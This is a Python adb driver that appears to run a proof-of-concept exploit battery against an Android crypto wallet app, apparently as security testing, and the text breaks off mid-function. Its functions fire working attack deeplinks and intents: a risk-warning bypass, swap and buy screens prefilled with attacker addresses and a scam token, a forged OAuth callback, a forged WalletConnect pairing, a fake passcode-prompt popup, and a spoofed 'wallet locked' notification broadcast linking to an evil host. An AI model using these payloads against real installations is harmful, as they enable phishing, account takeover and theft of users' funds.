#!/usr/bin/env python3
"""ult_drive.py — dump-driven onboarding + deeplink PoC driver for com.defi.wallet.
Runs on a host with adb attached to the arm64 emulator (TCG — all sleeps generous).
Produces: /tmp/ult/attack.log, screenshots, ui dumps, verdict lines.
r9: optional VPS-assisted login (own account only — RULES.md) if the login screen
exposes an input; everything still works pre-login without any credentials.
"""
import subprocess, time, os, re, datetime, sys, threading
import json, urllib.request

OUT = "/tmp/ult"
os.makedirs(OUT, exist_ok=True)
LOGF = open(f"{OUT}/attack.log", "a", buffering=1)

def log(m):
    ts = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    LOGF.write(f"[{ts}] {m}\n")
    print(m, flush=True)

def sh(cmd, t=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return "TIMEOUT"

_UI_VALID = True
_ANR_TEXT = "isn't responding"
_ANR_LAST_TAP = [0.0]

def _dump_once(tag):
    sh("adb shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1", 90)
    p = f"{OUT}/ui_{tag}.xml"
    sh(f"adb pull /sdcard/ui.xml {p} >/dev/null 2>&1", 45)
    try:
        return open(p, encoding="utf-8", errors="replace").read()
    except FileNotFoundError:
        return ""

def dismiss_anr(xml):
    """Tap 'Wait' on the ANR dialog (BACK does nothing; hide_error_dialogs is
    the primary prevention but this is the fallback). Rate-limited to 1 tap/120s."""
    if time.time() - _ANR_LAST_TAP[0] < 120:
        time.sleep(30)
        return False
    n = find(xml, "wait", clickable_only=True) or find(xml, "wait")
    if n and n.get("xy"):
        _ANR_LAST_TAP[0] = time.time()
        log("ANR dialog -> tap Wait (+90s settle)")
        tap(n)
        time.sleep(90)
        return True
    log("ANR dialog visible, no Wait button in dump yet")
    time.sleep(45)
    return False

def dump(tag="d"):
    global _UI_VALID
    xml = ""
    for k in range(3):
        xml = _dump_once(f"{tag}{'' if k == 0 else '_r' + str(k)}")
        if xml and _ANR_TEXT not in xml:
            break
        if xml:
            dismiss_anr(xml)          # ANR dialog on top -> tap Wait, retry
        else:
            time.sleep(20)            # empty dump: window/tooling not ready
    # round-6: also require non-empty TEXT. A launcher/no-content window dumps fine
    # (xml present) but has zero text nodes -> any UI verdict from it is a false positive
    # (round-5 T1 CONFIRMED was exactly this: textless launcher window).
    text = txt(xml).strip()
    _UI_VALID = bool(xml) and _ANR_TEXT not in xml.lower() and bool(text)
    if not _UI_VALID:
        log(f"dump({tag}) ui_valid=False len={len(xml)} text_len={len(text)}")
    return xml

def nodes(xml):
    out = []
    for m in re.finditer(r"<node[^>]*?/?>", xml):
        t = m.group(0)
        def g(a):
            mm = re.search(a + r'="([^"]*)"', t)
            return mm.group(1) if mm else ""
        b = g("bounds")
        bm = re.findall(r"\d+", b)
        out.append({
            "text": g("text"), "desc": g("content-desc"), "rid": g("resource-id"),
            "cls": g("class"), "click": g("clickable") == "true",
            "xy": (int(bm[0]) + int(bm[2])) // 2 if len(bm) == 4 else None,
            "cy": (int(bm[1]) + int(bm[3])) // 2 if len(bm) == 4 else None,
        })
    return out

def txt(xml):
    return " | ".join(n["text"] or n["desc"] for n in nodes(xml) if n["text"] or n["desc"])

def tap(n):
    if n and n.get("xy"):
        sh(f"adb shell input tap {n['xy']} {n['cy']}", 30)
        return True
    return False

def find(xml, *needles, clickable_only=False):
    for n in nodes(xml):
        hay = (n["text"] + " " + n["desc"] + " " + n["rid"]).lower()
        for s in needles:
            if s.lower() in hay:
                if clickable_only and not n["click"]:
                    continue
                return n
    return None

def tap_text(xml, *needles):
    n = find(xml, *needles, clickable_only=True) or find(xml, *needles)
    return tap(n)

def shot(name):
    sh(f"adb exec-out screencap -p > {OUT}/{name}.png", 60)

def home():
    sh("adb shell input keyevent KEYCODE_HOME", 20)
    time.sleep(6)

def back():
    sh("adb shell input keyevent KEYCODE_BACK", 20)
    time.sleep(4)

def fire(uri, tag):
    log(f"FIRE {tag}: {uri}")
    o = sh(f"adb shell \"am start -W -a android.intent.action.VIEW -d '{uri}'\"", 120)
    # r10: am start output was silently discarded — when an implicit deeplink is
    # a no-op (r9: T1-T9 dumped the launcher) we must SEE "Error/Status:" here.
    log(f"FIRE {tag} out: {' '.join(o.split())[:260]}")
    time.sleep(SLEEP)

def fire_explicit(uri, tag):
    log(f"FIRE_EXPLICIT {tag}: {uri}")
    # r11 FIX: the old component com.defi.cronos.manager.TransferStationActivity
    # does not exist (r10: 'Error type 3' -> T7 controls were void). The real
    # exported router is com.defi.wallet.app.TransferStationActivity (manifest
    # line + am output of T1_CONTROL: 'Activity: com.defi.wallet/.app.TransferStationActivity').
    o = sh("adb shell \"am start -W -n com.defi.wallet/com.defi.wallet.app.TransferStationActivity"
           f" -a android.intent.action.VIEW -d '{uri}'\"", 120)
    log(f"FIRE_EXPLICIT {tag} out: {' '.join(o.split())[:260]}")
    time.sleep(SLEEP)

def resumed():
    o = sh("adb shell dumpsys activity activities | grep -iE 'ResumedActivity|topResumedActivity' | head -3", 45)
    return o.replace("\r", " ")

SLEEP = int(os.environ.get("SLOW", "25"))   # TCG settle time after each action

PKG = "com.defi.wallet"
log(f"=== ult_drive start SLEEP={SLEEP}s ===")

# ---------------------------------------------------------------- onboarding
ONB_KEYWORDS = [
    "get started", "create", "new wallet", "i agree", "agree", "accept", "continue",
    "next", "skip", "not now", "remind me later", "later", "start", "set passcode",
    "passcode", "confirm", "understood", "ok", "okay", "allow", "no thanks", "done",
    "restore", "import", "terms", "privacy", "understand", "let's", "explore", "start now",
]

WELCOME_RE = re.compile(r"login with google|sign in with google|welcome|trade what")

def app_alive():
    # r9 FIX (root cause of the 40-min relaunch-only loop in r6/r7/r8): sh() runs
    # on the RUNNER host, so `pidof` must go through adb. Host pidof was always
    # empty -> app "always dead" -> onboard() only ever relaunched, never dumped.
    o = sh("adb shell pidof com.defi.wallet", 20)
    return bool(o.strip()) and "TIMEOUT" not in o

def launcher_up():
    low = resumed().lower()
    return "fakesystemapp" in low or "emptyhome" in low or "launcher" in low

def relaunch(tag):
    """App died (round-5: service-ANR kill ~90s in) or sits behind the fake
    launcher -> start Splash again; ART/OAT caches make warm starts fast."""
    log(f"RELAUNCH {tag}: alive={app_alive()} resumed={resumed()[:150]}")
    sh("adb shell am start -n com.defi.wallet/com.defi.wallet.feature.splash.SplashActivity", 60)
    time.sleep(SLEEP * 2)

def ensure_wallet_fg(tag, tries=4):
    """r10 FIX (r9 bug): after the login probe the stub browser/launcher stayed
    resumed and T1-T9 ran against it — every test dump read 'Fake System App'.
    Before each test the wallet itself must be THE resumed activity.
    r11: the ATD stub browser lives IN the wallet's own task and can steal the
    top during/after a relaunch (r10 pre_t10: try0 read CronosOnBoarding, the
    dump right after showed the stub) — try BACK first, then relaunch; each
    dump() also dismisses any ANR dialog on top."""
    for i in range(tries):
        r = resumed()
        if PKG in r:
            dump(f"fg_{tag}_{i}")
            if PKG in resumed():
                return True
            r = resumed()
        if "fakesystemapp" in r.lower():
            log(f"FG {tag} try{i}: stub browser on top -> BACK")
            back()
            r = resumed()
            if PKG in r:
                dump(f"fg_{tag}_{i}b")
                if PKG in resumed():
                    return True
                r = resumed()
        log(f"FG {tag} try{i}: relaunch ({r[:130]})")
        relaunch(f"{tag}_{i}")
        dump(f"fg_{tag}_{i}")
    ok = PKG in resumed()
    log(f"FG {tag}: final ok={ok} resumed={resumed()[:150]}")
    return ok

def onboard(max_rounds=60, budget_s=2400):
    seen = []
    relaunch_n = 0
    t_end = time.time() + budget_s   # cold RN init under TCG ~25-40 min (round-4: JS at +23min)
    for i in range(max_rounds):
        if time.time() > t_end:
            log("ONB: time budget exceeded -> exiting onboard")
            break
        # round-6: recover instead of waiting on a dead/backgrounded app forever
        # (round-5 spent all 30 rounds dumping the launcher because of this)
        # r9: cap the relaunch path — 5 consecutive relaunches with the target
        # package still foregrounded means the app IS alive (defensive: never
        # burn a whole budget in relaunch-only again).
        if launcher_up() or not app_alive():
            if relaunch_n < 5 or PKG not in resumed():
                relaunch_n += 1
                relaunch(f"onb{i}")
                continue
            log("ONB: repeated relaunch but pkg foreground -> continue as alive")
        else:
            relaunch_n = 0
        xml = dump(f"onb{i}")
        t = txt(xml)
        log(f"ONB{i}: {t[:400]}")
        seen.append(t[:120])
        if not t:
            # empty dump = window/tooling not ready; never BACK at this stage
            time.sleep(SLEEP); continue

        low = t.lower()
        # pre-login ceiling: welcome/login screen, stable across rounds -> we have
        # real app UI (tests can run deeplinks on top) but no account credentials
        if WELCOME_RE.search(low) and len(seen) > 1 and seen[-1] == seen[-2]:
            log("ONB: login/welcome screen stable (pre-login ceiling) -> stop")
            return True

        # passcode pad: >=6 numeric clickables (text or content-desc)
        def _d(n):
            return n["text"] or n["desc"]
        nums = [n for n in nodes(xml) if n["click"] and re.fullmatch(r"\d", _d(n) or "")]
        if len(nums) >= 6:
            log("ONB: passcode pad detected -> 123456 x2")
            order = {_d(n): n for n in nums}
            for d in "123456":
                tap(order.get(d)); time.sleep(3)
            time.sleep(8)
            xml2 = dump("onb_pin2")
            order2 = {_d(n): n for n in nodes(xml2)
                      if n["click"] and re.fullmatch(r"\d", _d(n) or "")}
            if len(order2) >= 6:
                for d in "123456":
                    tap(order2.get(d)); time.sleep(3)
            time.sleep(SLEEP)
            continue

        # checkbox-style consent: tap any checkbox/switch then primary button
        for cb in nodes(xml):
            if cb["click"] and (cb["rid"].endswith("checkbox") or cb["rid"].endswith("check_box")
                                or cb["desc"].lower() in ("checked", "unchecked")):
                log(f"ONB: tap checkbox {cb['rid']}")
                tap(cb); time.sleep(4); break

        # priority button order
        for kw in ["create", "get started", "i agree", "agree", "accept", "continue",
                   "next", "set passcode", "start", "understood", "ok", "okay", "allow",
                   "skip", "not now", "no thanks", "remind", "later", "done", "later"]:
            if tap_text(xml, kw):
                log(f"ONB: tapped '{kw}'")
                time.sleep(SLEEP)
                break
        else:
            # no keyword hit: scroll (buttons below the fold), BACK if truly stuck
            sh("adb shell input swipe 540 1900 540 700 500", 30)
            if len(seen) > 2 and seen[-1] == seen[-2]:
                log("ONB: screen unchanged -> BACK")
                back(); time.sleep(SLEEP)
            else:
                time.sleep(8)
        # done when home markers appear
        if re.search(r"\b(home|assets|portfolio|total balance|wallet)\b", low) and \
           not re.search(r"create|get started|i agree", low) and PKG in resumed():
            # guard: first-run home may still show onboarding overlay; require 2
            # hits AND the wallet itself resumed (r9 exited True while the stub
            # browser was on top — never trust a match from a non-pkg screen).
            if t[:120] in seen[:-1]:
                log(f"ONB: home-like screen stable -> exiting onboard ui={t[:120]}")
                return True
    return False

# ------------------------------------------------------- r9: login assist + pre-login surface
ASSIST_URL = os.environ.get("ASSIST_URL", "http://43.156.21.122:8081/ua_9x42k1.json")

def assist_get(stage, timeout_s=900):
    """Poll the VPS assist file for {stage: value} (own-account email/OTP supplied
    by the operator). Returns None on timeout. Read-only GET; file lives on the
    same port that already serves the APK parts to this runner."""
    t0 = time.time()
    while time.time() - t0 < timeout_s:
        try:
            r = urllib.request.urlopen(
                ASSIST_URL + "?ts=" + str(int(time.time())), timeout=15).read().decode()
            d = json.loads(r)
            if d.get(stage):
                log(f"ASSIST stage={stage} received")
                return str(d[stage])
        except Exception as e:
            log(f"ASSIST poll: {type(e).__name__}: {e}"[:160])
        time.sleep(15)
    log(f"ASSIST stage={stage} TIMEOUT ({timeout_s}s)")
    return None

def adb_type(s):
    # `input text` breaks on quotes/backticks/$ via double shell interpretation —
    # strip them and log if anything was removed (operator picks compatible OTP/
    # password; email addresses never contain these).
    clean = re.sub(r"[\\'\"`$]", "", str(s))
    if clean != str(s):
        log(f"TYPE: sanitized chars removed ({len(str(s))} -> {len(clean)})")
    sh(f"adb shell input text '{clean.replace(' ', '%s')}'", 45)

def prep_google_login():
    """r15 (r14b logcat): the G-button tap DOES reach Privy (RCTPrivyAndroidModule
    oauthLogin -> generateOAuthUrl) but the follow-up VIEW intent never dispatched
    an activity — Android 13 browser-role resolution hit RoleControllerManager
    TimeoutException and silently dropped the intent, so the UI stays on the wall
    (r14b mis-labeled that 'no_input'). Pre-set the BROWSER role holder so the
    OAuth URL goes straight to Chrome, and pre-run Chrome once so its first-run
    screen can't sit in front of the Custom Tab."""
    log("PREP: setting BROWSER role holder -> com.android.chrome")
    # r15c: API33 role service rejected "add-role-holders" with "Unknown command" —
    # this build's shell verb is SINGULAR (SO evidence: `cmd role remove-role-holder`).
    # Try verb/user variants until one sticks, then read the holder back as proof.
    ok = False
    for verb in ("add-role-holders", "add-role-holder"):
        for extra in ("", "--user 0 "):
            r = sh(f"adb shell cmd role {verb} {extra}android.app.role.BROWSER com.android.chrome", 40)
            log(f"PREP role {verb} {extra}-> {r[:200]}")
            if "unknown command" not in r.lower() and r.strip():
                ok = True
                break
        if ok:
            break
    for verb in ("get-role-holders", "get-role-holder"):
        gv = sh(f"adb shell cmd role {verb} android.app.role.BROWSER", 30)
        if "unknown command" not in gv.lower() and gv.strip():
            log(f"PREP role verify {verb}: {gv[:200]}")
            break
    else:
        log(f"PREP role verify FAILED (last={gv[:120]})")
    if not sh("adb shell pm path com.android.chrome", 30).strip():
        log("PREP: chrome missing -> skip warm-up")
        return
    sh("adb shell am start -n com.android.chrome/com.google.android.apps.chrome.Main", 45)
    time.sleep(30)
    for k in range(4):
        x = dump(f"chrome_wu{k}")
        low = txt(x).lower()
        if "accept" in low and "continue" in low:
            log("PREP: chrome first-run -> accept")
            tap_text(x, "accept & continue") or tap_text(x, "accept")
            time.sleep(20); continue
        if "no thanks" in low:
            log("PREP: chrome prompt -> no thanks")
            tap_text(x, "no thanks"); time.sleep(12); continue
        break
    log(f"PREP chrome warm ui={txt(dump('chrome_wu_end'))[:180]}")
    sh("adb shell input keyevent KEYCODE_HOME", 20)   # Chrome stays warm, in bg
    time.sleep(5)
    ensure_wallet_fg("pre_login")

def login_probe():
    """r9: the ONLY pre-login affordance on the login wall is the 'Login with
    Google' button (no email field, no create-wallet — verified from the dump).
    Tap it, classify what happens, and if an input appears drive it with the
    VPS-assisted email/OTP. Returns: no_button | gms_blocked | no_input |
    assisted_login_ok | assisted_login_fail."""
    x = dump("probe0")
    btn = find(x, "login with google", clickable_only=True) or \
          find(x, "google", clickable_only=True)
    if not btn:
        shot("probe_nobtn")
        log(f"PROBE: no google button on screen ui={txt(x)[:250]}")
        return "no_button"
    tap(btn)
    # r15 (r14b): TCG box runs class-verification at ~8 bytecodes/s — the Custom Tab
    # takes MINUTES to appear; a single +30s snapshot always saw the wall and
    # mis-labeled the flow. Poll up to ~7 min; absorb Chrome first-run inside the tab.
    x = ""
    for k in range(14):
        time.sleep(15)
        x = dump(f"probe1{'' if k == 0 else '_r' + str(k)}")
        low = txt(x).lower()
        res = resumed().lower()
        log(f"PROBE poll{k}: {txt(x)[:200]}")
        if "accept" in low and "continue" in low:
            log("PROBE: chrome first-run inside tab -> accept")
            tap_text(x, "accept & continue") or tap_text(x, "accept")
            time.sleep(15); continue
        if "no thanks" in low and not any(
                n["cls"].lower().endswith("edittext") for n in nodes(x)):
            log("PROBE: chrome prompt -> no thanks")
            tap_text(x, "no thanks"); time.sleep(10); continue
        if any(n["cls"].lower().endswith("edittext") for n in nodes(x)) \
           or "email" in low or "phone" in low or "verify" in low \
           or "one-time" in low or "code" in low or "choose an account" in low:
            break
        if "play services" in low or "fakesystemapp" in res \
           or "fake system app" in low or ("couldn" in low and "sign" in low):
            break
    sh("adb logcat -d -t 600 > /tmp/ult/probe_tap.logcat 2>&1", 90)
    low = txt(x).lower()
    log(f"PROBE after tap: {txt(x)[:300]}")
    shot("probe1")
    if "play services" in low or ("couldn't" in low and "sign" in low) \
       or "not available" in low:
        log("PROBE=gms_unavailable (ATD image has no GMS)"); return "gms_blocked"
    # r10: on ATD the tap opens a Custom Tab that dead-ends in the fake-system-app
    # stub browser (r9: text='Fake System App', resumed=StubBrowserActivity) —
    # that IS the GMS-blocked outcome, not "flow unknown".
    if "fakesystemapp" in resumed().lower() or "fake system app" in low:
        log("PROBE=gms_blocked (custom tab dead-ends in ATD stub browser)")
        back(); time.sleep(4)
        return "gms_blocked"
    # email/OTP input of any kind -> assist channel
    has_input = any(n["cls"].lower().endswith("edittext") for n in nodes(x))
    if not (has_input or "email" in low or "phone" in low or "verify" in low
            or "one-time" in low or "code" in low):
        log("PROBE=no_input (flow unknown / stuck)"); shot("probe_noinput")
        return "no_input"
    email = assist_get("email", 120)
    if not email:
        log("PROBE: no email provided via assist -> abort login"); return "no_input"
    # tap the first input, type, submit (next/sign/continue/send)
    inp = next((n for n in nodes(x) if n["cls"].lower().endswith("edittext")), None)
    if inp and tap(inp):
        time.sleep(3); adb_type(email); time.sleep(2)
        sh("adb shell input keyevent 66", 20)   # ENTER
        time.sleep(15)
    # up to 3 follow-up input rounds (otp / password / resend prompt)
    for rnd in range(3):
        x = dump(f"probe_in{rnd}")
        low = txt(x).lower()
        log(f"PROBE in{rnd}: {txt(x)[:250]}")
        shot(f"probe_in{rnd}")
        if not any(n["cls"].lower().endswith("edittext") for n in nodes(x)):
            log(f"PROBE in{rnd}: no input — login likely completed"); break
        stage = "otp" if rnd == 0 else f"step{rnd}"
        val = assist_get(stage, 900)
        if not val:
            log(f"PROBE: assist '{stage}' timeout -> abort login"); return "assisted_login_fail"
        inp = next((n for n in nodes(x) if n["cls"].lower().endswith("edittext")), None)
        if inp and tap(inp):
            time.sleep(3); adb_type(val); time.sleep(2)
            sh("adb shell input keyevent 66", 20)
            time.sleep(15)
    x = dump("probe_final")
    low = txt(x).lower()
    gone = not WELCOME_RE.search(low)
    log(f"PROBE final: welcome_gone={gone} ui={txt(x)[:250]}")
    return "assisted_login_ok" if gone else "assisted_login_fail"

def t10_oauth_forged():
    # exported io.privy.sdk.oAuth.PriviRedirectActivity (scheme cronos-oauth):
    # any app/browner on the device can inject an OAuth callback. OBSERVED record
    # only (never CONFIRMED) — real proof comes from logcat.txt evidence review.
    fire("cronos-oauth://oauth/callback?code=FORGED_R9&state=FORGED_R9", "T10_OAUTH")
    x = dump("t10"); r = resumed()
    verdict_line("T10_oauth_forged_callback_observed", False,
                 f"resumed={r[:180]} ui={txt(x)[:180]}", ui_ok=True)
    back(); time.sleep(SLEEP)

def t11_wc_injection():
    # wc: scheme is handled by the exported TransferStationActivity — inject a
    # forged WalletConnect pairing URI and record what the app does pre-login.
    fire("wc:7f3a9c2e4b1d5a6f8e0c2b4d6a8f1e3c@1?relay-protocol=irn"
         "&symKey=0000000000000000000000000000000000000000000000000000000000000000",
         "T11_WC")
    x = dump("t11"); r = resumed()
    verdict_line("T11_wc_pairing_observed", False,
                 f"resumed={r[:180]} ui={txt(x)[:200]}", ui_ok=True)
    back(); time.sleep(SLEEP)

# ---------------------------------------------------------------- tests
def verdict_line(cid, ok, why, ui_ok=None):
    """Honesty guard: if the current UI is unavailable (empty dump or ANR dialog),
    a UI-derived positive must not be reported as CONFIRMED. Observational tests
    based on dumpsys pass ui_ok=True explicitly."""
    valid = _UI_VALID if ui_ok is None else ui_ok
    if not valid:
        log(f"VERDICT {cid}=NOT_PROVEN :: INCONCLUSIVE(ui_unavailable) {why}")
    else:
        log(f"VERDICT {cid}={'CONFIRMED' if ok else 'NOT_PROVEN'} :: {why}")

def t1_control_risk():
    fire("dfw://dapp/detail?dappUrl=https://example.com", "T1_CONTROL")
    x = dump("t1_ctrl"); shot("t1_ctrl")
    t = txt(x).lower()
    ok = any(k in t for k in ("risk", "warn", "caution", "proceed", "understand"))
    verdict_line("T1_control_risk_dialog", ok, f"ui={txt(x)[:200]}")
    back(); time.sleep(SLEEP)

def t1_bypass():
    fire("dfw://dapp/detail?dappUrl=https://example.com&forceDismissRiskDialog=true", "T1_ATTACK")
    x = dump("t1_atk"); shot("t1_atk")
    t = txt(x).lower()
    risk = any(k in t for k in ("risk", "caution"))
    # round-6: `not risk` alone was a false-positive machine (no risk text on a
    # login/launcher screen also = "no risk"). Bypass requires POSITIVE navigation
    # evidence into the browser while risk text is absent.
    nav = any(k in t for k in ("example", "https://", "http://", "address", "browser", "url"))
    ok = (not risk) and nav
    verdict_line("T1_forceDismiss_risk_bypass", ok,
                 f"risk_dialog_present={risk} nav_evidence={nav} ui={txt(x)[:200]}")
    back(); time.sleep(SLEEP)

def t2_swap_prefill():
    fire("dfw://trade/swap?chain=eth&fromAddress=0xAAA111AAA111AAA111AAA111AAA111AAA111AAA1"
         "&toChainCode=eth&toAddress=0xBBB222BBB222BBB222BBB222BBB222BBB222BBB2&fromAmount=123.45",
         "T2_SWAP")
    x = dump("t2"); shot("t2")
    t = txt(x)
    ok = ("123.45" in t) or ("BBB222" in t.upper()) or ("AAA111" in t.upper())
    verdict_line("T2_swap_prefill", ok, f"ui={t[:300]}")
    shot("t2_full")
    back(); time.sleep(SLEEP)

def t3_siblings():
    fire("dfw://add/fund?chain=eth&contractAddress=0xEVILSCAM0000000000000000000000000001"
         "&symbol=SCAMCOIN", "T3A_ADDFUND")
    x = dump("t3a"); shot("t3a")
    verdict_line("T3a_addfund_prefill", "SCAMCOIN" in txt(x), f"ui={txt(x)[:250]}")
    back(); time.sleep(SLEEP)
    fire("dfw://buy/amount?amount=999.99&contractAddress=0xEVILSCAM0000000000000000000000000001"
         "&symbol=SCAMCOIN&network=eth&chainId=1", "T3B_BUY")
    x = dump("t3b"); shot("t3b")
    verdict_line("T3b_buy_prefill", "999.99" in txt(x) or "SCAMCOIN" in txt(x), f"ui={txt(x)[:250]}")
    back(); time.sleep(SLEEP)

def t4_browser():
    fire("dfw://browser/detail?url=https://example.com", "T4_BROWSER")
    x = dump("t4"); shot("t4")
    t = txt(x).lower()
    verdict_line("T4_browser_arbitrary_url", "example" in t or "example.com" in t, f"ui={txt(x)[:250]}")
    back(); time.sleep(SLEEP)

def t5_lock():
    # background the app while (possibly) passcode-locked, then deeplink in
    home(); time.sleep(SLEEP)
    r0 = resumed()
    fire("dfw://trade/swap?chain=eth&toChainCode=eth&toAddress=0xBBB222BBB222BBB222BBB222BBB222BBB222BBB2"
         "&fromAmount=123.45", "T5_LOCK")
    r1 = resumed()
    x = dump("t5"); shot("t5")
    t = txt(x).lower()
    locked = any(k in t for k in ("passcode", "enter passcode", "pin", "fingerprint", "unlock"))
    swap_visible = "123.45" in t
    # r9 honesty: ok = the swap screen actually rendered with attacker prefill
    # (that IS the vuln claim). locked/resumed stay as evidence in `why` — the
    # old hardcoded True produced a fake CONFIRMED every round.
    verdict_line("T5_deeplink_behind_lock", swap_visible,
                 f"locked_overlay={locked} swap_prefill_behind_lock={swap_visible} "
                 f"resumed_before={r0[:150]} resumed_after={r1[:150]} ui={txt(x)[:200]}")
    back(); time.sleep(SLEEP)

T6_EXPECT = {
    # module page must show ITS OWN topic. round-5 used `len(t)>3` which matched
    # the unrelated login/welcome screen -> two false CONFIRMEDs.
    "ResetPasscodeFlowPage": ("passcode", "enter pin", "forgot", "confirm"),
    "RemoveAccountPage": ("remove account", "delete account", "remove wallet",
                          "i understand", "permanently"),
    "SettingsPage": ("settings", "preference", "currency", "language",
                     "notification", "security"),
}

def t6_rn_modules():
    for mod in ("ResetPasscodeFlowPage", "RemoveAccountPage", "SettingsPage"):
        fire(f"dfw://reactnative/page?moduleName={mod}", f"T6_{mod}")
        x = dump(f"t6_{mod}"); shot(f"t6_{mod}")
        t = txt(x)
        low = t.lower()
        hit = mod.lower().replace("page", "") in low.replace(" ", "") or \
            any(k in low for k in T6_EXPECT[mod])
        verdict_line(f"T6_{mod}", hit, f"ui={t[:250]}")
        home(); time.sleep(SLEEP)

def t9_popup_chain():
    # C4 chain: externally-spoofed in-app dialog whose button routes into the app browser
    fire("dfw://modal/popup?title=Security%20Update%20Required&message=Re-enter%20your%20passcode%20to%20keep%20your%20wallet%20safe"
         "&button=Continue&router_url=dfw://browser/detail%3Furl%3Dhttps%3A%2F%2Fexample.com", "T9_POPUP")
    x = dump("t9"); shot("t9")
    t = txt(x)
    spoof = "Security Update Required" in t or "Re-enter your passcode" in t
    verdict_line("T9_popup_spoof_text", spoof, f"ui={t[:300]}")
    if spoof:
        tap_text(x, "continue", "ok", "button")
        time.sleep(SLEEP)
        x2 = dump("t9b"); shot("t9b")
        t2 = txt(x2).lower()
        verdict_line("T9b_popup_router_to_browser", "example" in t2 or "example.com" in t2,
                     f"ui={txt(x2)[:250]}")
    back(); time.sleep(SLEEP)

def t7_negatives():
    # explicit intent with non-whitelisted scheme -> app should drop it.
    # r9 honesty: vuln claim = validator ACCEPTS evil:// (new screen appears);
    # a clean drop is recorded in `why` as a passed control, never as CONFIRMED.
    log("T7: explicit evil:// intent to TransferStation (expect validator drop)")
    r0 = resumed()
    sh("adb shell \"am start -W -n com.defi.wallet/com.defi.wallet.app.TransferStationActivity"
       " -a android.intent.action.VIEW -d 'evil://x'\"", 60)
    time.sleep(SLEEP)
    x = dump("t7"); shot("t7")
    r = resumed()
    dropped = (r == r0) or ("Splash" in r) or ("CronosOnBoarding" in r)
    verdict_line("T7_validator_evil_scheme_accepted", not dropped,
                 f"validator_dropped={dropped} resumed_before={r0[:120]} "
                 f"resumed={r[:120]} ui={txt(x)[:150]}", ui_ok=True)
    # startsWith('tc') looseness: tcfoo:// accepted by validator but no nav route
    r20 = resumed()
    fire_explicit("tcfoo://anything", "T7B_tc_prefix")
    r2 = resumed()
    moved = (r2 != r20)
    verdict_line("T7B_tc_prefix_accepted", moved,
                 f"validator_moved_screen={moved} resumed={r2[:150]}", ui_ok=True)

def t12_broadcast_injection():
    """r11 lesson: the plain implicit am broadcast was BLOCKED by Android 8+
    ('Background execution not allowed' — component/package were null). The
    real attacker model is a malicious app calling setComponent() on this
    EXPORTED, permission-less receiver, which IS allowed for background
    manifest receivers -> r12 sends EXPLICIT (-n).
    Evidence chain = observational (ui_ok=True): our unique attack text inside
    dumpsys NotificationRecord proves receiver execution + notification post;
    shade/in-app UI text is bonus proof (spoof_ui). Fallback variant B retries
    while the wallet is foregrounded (b.b in-app path)."""
    BC = ("adb shell \"am broadcast"
          " -n com.defi.wallet/com.defi.core.mediator.notification.LocalNotificationAlarmReceiver"
          " -a com.defi.core.mediator.START_NOTIFICATION_ALARM"
          " --es header 'URGENT: Wallet security alert'"
          " --es body 'Your wallet is temporarily locked. Tap to restore access.'"
          " --es routerUrl 'dfw://dapp/detail?dappUrl=https://evil.example.com'"
          " --ei notificationId 4242\"")

    def snap(tag):
        sh("adb shell \"dumpsys notification --noredact 2>/dev/null || dumpsys notification\""
           " > " + OUT + "/notif_" + tag + ".txt", 40)
        h = sh("grep -c 'URGENT: Wallet security alert' " + OUT + "/notif_" + tag + ".txt"
               " 2>/dev/null || true", 20)
        try:
            return int(" ".join(h.split()).splitlines()[-1])
        except Exception:
            return 0

    # --- variant A: wallet in background => b.b takes the notification path
    home(); time.sleep(6)
    snap("before")
    o = sh(BC, 40)
    log(f"T12 broadcast(explicit) out: {' '.join(o.split())[:250]}")
    time.sleep(SLEEP)
    nA = snap("after")
    recv = sh("adb shell \"logcat -d -t 700 | grep -i LocalNotificationAlarmReceiver\"", 40)
    log(f"T12 receiver log: {' '.join(recv.split())[:350]}")
    so = sh("adb shell cmd statusbar expand-notifications", 20)
    log(f"T12 shade expand: {' '.join(so.split())[:150]}")
    time.sleep(8)
    x = dump("t12_shade")
    t = txt(x)
    spoof_ui = any(k in t.lower() for k in ("wallet security alert", "restore access"))
    sh("adb shell cmd statusbar collapse", 20); time.sleep(4)

    nB = 0; t2 = ""
    if nA == 0 and not spoof_ui:
        log("T12 bg path blocked -> variant B: wallet FOREGROUND, same explicit broadcast")
        ensure_wallet_fg("t12fg")
        o2 = sh(BC, 40)
        log(f"T12 broadcast(fg) out: {' '.join(o2.split())[:250]}")
        time.sleep(SLEEP)
        nB = snap("after_fg")
        x2 = dump("t12_fg")
        t2 = txt(x2)
        if any(k in t2.lower() for k in ("wallet security alert", "restore access")):
            spoof_ui = True

    ok = ((nA + nB) > 0) or spoof_ui
    verdict_line("T12_exported_receiver_spoofed_notification", ok,
                 f"dumpsys_hits bg={nA} fg={nB} spoof_ui={spoof_ui} "
                 f"shade_ui={t[:180]} fg_ui={t2[:150]} recv={' '.join(recv.split())[:220]}",
                 ui_ok=True)

# ---------------------------------------------------------------- main
def main():
    sh("adb logcat -c", 30)
    # already onboarded? (fresh run may find home directly)
    x0 = dump("pre")
    log(f"PRE: {txt(x0)[:300]}")
    onb_ok = onboard()
    log(f"ONBOARD_DONE={onb_ok} resumed={resumed()}")
    shot("after_onboard")

    # r9: pre-login attack surface FIRST (login would change app state):
    #   T10 = forged cronos-oauth callback into exported PriviRedirectActivity
    #   T11 = forged WalletConnect wc: pairing URI into exported TransferStation
    ensure_wallet_fg("pre_t10")   # r10: r9 fired T10 with the stub browser resumed
    t10_oauth_forged()
    t11_wc_injection()
    # r9: probe the login wall's only affordance; VPS-assist drives email/OTP
    # when an input appears (own account, RULES.md). Classifies the flow either way.
    prep_google_login()   # r15: role holder + Chrome warm-up BEFORE the tap
    pr = login_probe()
    log(f"LOGIN_PROBE={pr}")
    if pr == "assisted_login_ok":
        onb2 = onboard(max_rounds=25, budget_s=900)
        log(f"ONBOARD2_DONE={onb2} resumed={resumed()}")

    # r10: probe dead-ends in the stub browser — the battery needs the wallet
    # resumed (r9 ran all of T1-T9 against the fake launcher; see ensure_wallet_fg)
    ensure_wallet_fg("post_probe")

    # r15: r14b produced only rec1 — the host-side loop stalls after seg1 (encoder/
    # adb stall right after the first session). Drive rotation ourselves: explicit
    # pkill -INT (graceful finalize), every adb call bounded, one retry per segment;
    # 28x170s ≈ 79min covers the full test run through t5/t7.
    def rec_worker():
        # r15c autopsy: 27/28 segments size=0 (file never created) while rec1 ran its
